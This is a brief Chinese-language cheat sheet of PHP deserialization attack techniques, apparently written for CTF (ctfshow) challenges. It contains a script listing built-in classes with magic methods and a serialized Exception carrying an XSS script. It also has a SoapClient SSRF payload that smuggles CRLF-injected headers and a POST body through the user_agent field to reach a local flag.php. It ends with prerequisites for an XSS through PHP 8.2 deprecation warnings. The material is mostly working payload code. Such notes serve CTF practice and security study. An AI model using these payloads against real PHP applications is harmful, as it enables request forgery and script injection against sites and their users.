## 枚举所有包含魔术方法的内置类
```php
<?php
$classes = get_declared_classes();
foreach ($classes as $class) {
    $methods = get_class_methods($class);
    foreach ($methods as $method) {
        if (in_array($method, array(
            '__destruct',
            '__toString',
            '__wakeup',
            '__call',
            '__callStatic',
            '__get',
            '__set',
            '__isset',
            '__unset',
            '__invoke',
            '__set_state'
        ))) {
            print $class . '::' . $method . "\n";
        }
    }
}
```

```php

$a = new Exception("<script>alert('xss2')</script>");
$b = serialize($a);

?>
```

## 利用 SoapClient 类进行 SSRF

```php
<?php
$ua = "z3eyond\r\nX-Forwarded-For: 127.0.0.1,127.0.0.1\r\nContent-Type: application/x-www-form-urlencoded\r\nContent-Length: 13\r\n\r\ntoken=ctfshow";

$client = new SoapClient(null,array('uri' => 'http://127.0.0.1/' , 'location' => 'http://127.0.0.1/flag.php' , 'user_agent' => $ua));

print_r(urlencode(serialize($client)));
```

## 利用动态属性弃用警告达成 XSS
前提条件：
1. PHP 版本：PHP 8.2+ （引入了动态属性弃用警告）
2. 错误显示：display_errors = On
3. 反序列化触发：能够执行包含恶意 payload 的反序列化操作
4. Web 环境：在浏览器中显示错误消息

- [php-src/ext/standard/var\_unserializer.re at PHP-8.4.10 · php/php-src](https://github.com/php/php-src/blob/PHP-8.4.10/ext/standard/var_unserializer.re#L649)
